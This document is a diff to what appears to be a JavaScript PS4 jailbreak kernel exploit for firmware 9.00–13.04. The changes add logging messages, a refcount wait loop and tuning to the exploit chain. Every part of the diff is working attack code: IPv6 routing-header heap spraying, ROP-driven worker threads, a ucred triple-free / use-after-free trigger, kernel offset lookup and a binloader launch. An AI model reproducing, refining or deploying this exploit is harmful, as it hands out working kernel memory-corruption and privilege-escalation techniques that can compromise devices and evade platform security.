@@ -117,7 +117,7 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 3;
+var MAIN_LOOP_ITERATIONS = 4;
 var TRIPLEFREE_ITERATIONS = 7;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 120;
@@ -289,6 +289,7 @@ function get_rtprio() {
 function create_workers() {
   var sock_buf = malloc(8);
   if (!sock_buf) {
+    log('create_workers: malloc(8) failed');
     return false;
   }
 
@@ -301,10 +302,12 @@ function create_workers() {
     var pipe_0 = read32(sock_buf);
     var pipe_1 = read32(sock_buf.add(4));
     if (pipe_0 <= 0 || pipe_1 <= 0) {
+      log('create_workers: socketpair failed for iov_recvmsg_workers[' + i + ']');
       return false;
     }
     var ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf);
     if (!ret || !ret.rop || typeof ret.loop_size === 'undefined') {
+      log('create_workers: invalid ROP for iov_recvmsg_workers[' + i + ']');
       return false;
     }
     iov_recvmsg_workers[i] = {
@@ -327,10 +330,12 @@ function create_workers() {
     var pipe_2 = read32(sock_buf);
     var pipe_3 = read32(sock_buf.add(4));
     if (pipe_2 <= 0 || pipe_3 <= 0) {
+      log('create_workers: socketpair failed for uio_readv_workers[' + j + ']');
       return false;
     }
     var ret2 = uio_readv_worker_rop(ready2, new BigInt(pipe_2), done2, signal_buf2);
     if (!ret2 || !ret2.rop || typeof ret2.loop_size === 'undefined') {
+      log('create_workers: invalid ROP for uio_readv_workers[' + j + ']');
       return false;
     }
     uio_readv_workers[j] = {
@@ -353,10 +358,12 @@ function create_workers() {
     var pipe_4 = read32(sock_buf);
     var pipe_5 = read32(sock_buf.add(4));
     if (pipe_4 <= 0 || pipe_5 <= 0) {
+      log('create_workers: socketpair failed for uio_writev_workers[' + k + ']');
       return false;
     }
     var ret3 = uio_writev_worker_rop(ready3, new BigInt(pipe_4), done3, signal_buf3);
     if (!ret3 || !ret3.rop || typeof ret3.loop_size === 'undefined') {
+      log('create_workers: invalid ROP for uio_writev_workers[' + k + ']');
       return false;
     }
     uio_writev_workers[k] = {
@@ -378,10 +385,12 @@ function create_workers() {
   var pipe_6 = read32(sock_buf);
   var pipe_7 = read32(sock_buf.add(4));
   if (pipe_6 <= 0 || pipe_7 <= 0) {
+    log('create_workers: socketpair failed for spray_ipv6_worker');
     return false;
   }
   var ret4 = ipv6_sock_spray_and_read_rop(ready4, new BigInt(pipe_6), done4, signal_buf4);
   if (!ret4 || !ret4.rop || typeof ret4.loop_size === 'undefined') {
+    log('create_workers: invalid ROP for spray_ipv6_worker');
     return false;
   }
   spray_ipv6_worker = {
@@ -402,16 +411,19 @@ function init_workers() {
   for (var i = 0; i < IOV_THREAD_NUM; i++) {
     var w = iov_recvmsg_workers[i];
     if (!w || !w.rop) {
+      log('init_workers: invalid iov_recvmsg_workers[' + i + ']');
       return false;
     }
     ret = spawn_thread(w.rop, w.loop_size);
     if (ret.eq(BigInt_Error)) {
+      log('init_workers: spawn_thread failed for iov_recvmsg_workers[' + i + ']');
       return false;
     }
     w.thread_id = Number(ret.and(0xFFFFFFFF));
 
     // أهم إصلاح — منع freeze بسبب thread_id فاسد
     if (!w.thread_id || w.thread_id <= 0 || isNaN(w.thread_id)) {
+      log('init_workers: invalid thread_id for iov_recvmsg_workers[' + i + ']');
       return false;
     }
   }
@@ -420,14 +432,17 @@ function init_workers() {
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     var w2 = uio_readv_workers[j];
     if (!w2 || !w2.rop) {
+      log('init_workers: invalid uio_readv_workers[' + j + ']');
       return false;
     }
     ret = spawn_thread(w2.rop, w2.loop_size);
     if (ret.eq(BigInt_Error)) {
+      log('init_workers: spawn_thread failed for uio_readv_workers[' + j + ']');
       return false;
     }
     w2.thread_id = Number(ret.and(0xFFFFFFFF));
     if (!w2.thread_id || w2.thread_id <= 0 || isNaN(w2.thread_id)) {
+      log('init_workers: invalid thread_id for uio_readv_workers[' + j + ']');
       return false;
     }
   }
@@ -436,14 +451,17 @@ function init_workers() {
   for (var k = 0; k < UIO_THREAD_NUM; k++) {
     var w3 = uio_writev_workers[k];
     if (!w3 || !w3.rop) {
+      log('init_workers: invalid uio_writev_workers[' + k + ']');
       return false;
     }
     ret = spawn_thread(w3.rop, w3.loop_size);
     if (ret.eq(BigInt_Error)) {
+      log('init_workers: spawn_thread failed for uio_writev_workers[' + k + ']');
       return false;
     }
     w3.thread_id = Number(ret.and(0xFFFFFFFF));
     if (!w3.thread_id || w3.thread_id <= 0 || isNaN(w3.thread_id)) {
+      log('init_workers: invalid thread_id for uio_writev_workers[' + k + ']');
       return false;
     }
   }
@@ -464,6 +482,7 @@ function wait_for(addr, threshold) {
     nanosleep_fun(1);
     spins++;
     if (spins >= MAX_SPINS) {
+      log('wait_for: timeout waiting for ' + hex(addr));
       break;
     }
   }
@@ -579,7 +598,10 @@ function wait_uio_writev() {
 function init() {
   log('***** Starting PS4 Jailbreak *****');
   FW_VERSION = get_fwversion();
+  log('Detected PS4 firmware: ' + FW_VERSION);
   if (!FW_VERSION) {
+    log('Failed to detect PS4 firmware version.\nAborting...');
+    send_notification('Failed to detect PS4 firmware version.\nAborting...');
     return false;
   }
   var compare_version = function (a, b) {
@@ -595,10 +617,12 @@ function init() {
     return amaj === bmaj ? amin - bmin : amaj - bmaj;
   };
   if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
+    log('Unsupported PS4 firmware\nSupported: 9.00-13.04\nAborting...');
     send_notification('Unsupported PS4 firmware\nAborting...');
     return false;
   }
   kernel_offset = get_kernel_offset(FW_VERSION);
+  log('Kernel offsets loaded for FW ' + FW_VERSION);
   return true;
 }
 var prev_core = -1;
@@ -616,6 +640,7 @@ function setup() {
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
+      log('setup: invalid spray_rthdr_len');
       cleanup(true);
       return false;
     }
@@ -628,6 +653,7 @@ function setup() {
     write64(msg.add(0x18), MSG_IOV_NUM);
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
+      log('setup: malloc(dummyBuffer) failed');
       cleanup(true);
       return false;
     }
@@ -643,6 +669,7 @@ function setup() {
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
+        log('setup: failed to create ipv6_socks[' + s + ']');
         cleanup(true);
         return false;
       }
@@ -664,16 +691,19 @@ function setup() {
     fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
     init_threading();
     if (!create_workers()) {
+      log('setup: create_workers failed');
       cleanup(true);
       return false;
     }
     if (!init_workers()) {
+      log('setup: init_workers failed');
       cleanup(true);
       return false;
     }
     debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
     return true;
   } catch (e) {
+    log('setup ERROR: ' + e.message);
     cleanup(true);
     return false;
   }
@@ -760,6 +790,7 @@ function find_twins() {
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
+        log(' Jailbreak failed!');
         cleanup();
         return false;
       }
@@ -780,14 +811,10 @@ function find_twins() {
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
       val = read32(leak_add);
       j = val & 0xFFFF;
-      if (j < 0 || j >= ipv6_socks.length) continue;
-      if (i <= 1 || j <= 1) {
-        continue; // تجاهل التوينز اللي في 0 أو 1
-      }
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        debug('TWINS FOUND: ' + i + ' <-> ' + j);
+        log('GLITCH : [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -795,6 +822,7 @@ function find_twins() {
   }
   twins[0] = -1;
   twins[1] = -1;
+  log('find_twins failed');
   return false;
 }
 function find_triplet(master, other, iterations) {
@@ -817,7 +845,7 @@ function find_triplet(master, other, iterations) {
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
     val = read32(leak_add);
     j = val & 0xFFFF;
-    if (j < 0 || j >= ipv6_socks.length) continue;
+
     // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
@@ -902,6 +930,7 @@ function netctrl_exploit() {
   if (!supported_fw) {
     return;
   }
+  log('Stability by M.ELHOUT');
   exploit_end = false;
   exploit_count = 0;
   yield_to_render(exploit_phase_setup);
@@ -1065,8 +1094,7 @@ function jailbreak() {
   cleanup(false);
   show_success();
   run_binloader();
-  utils.notify(' [ Stability by DV M.ELHOUT ]');
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > ');
+  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1253,14 +1281,12 @@ function remove_uaf_file() {
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
-
 function trigger_ucred_triplefree() {
   var end = false;
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
-
   var main_count = 0;
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
@@ -1303,13 +1329,33 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // ✅ 10) مفيش انتظار refcount هنا خالص
-    // نكمّل على طول
+    // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
+    var count = 0;
+    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      // شغّل recvmsg
+      trigger_iov_recvmsg();
 
+      // كمّل دورة iov بالكامل
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
+
+      // دلوقتي بس نقرأ refcount
+      write32(leak_rthdr.add(0x04), 0);
+      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
+      if (read32(leak_rthdr) === 1) break;
+      count++;
+    }
+    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      twins[0] = -1;
+      twins[1] = -1;
+      close(new BigInt(uaf_socket));
+      end = false;
+      continue;
+    }
     triplets[0] = twins[0];
 
     // 11) triple free فعليًا
@@ -1336,11 +1382,9 @@ function trigger_ucred_triplefree() {
       end = false;
       continue;
     }
-
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
-
   if (main_count === TRIPLEFREE_ITERATIONS) {
     return false;
   }
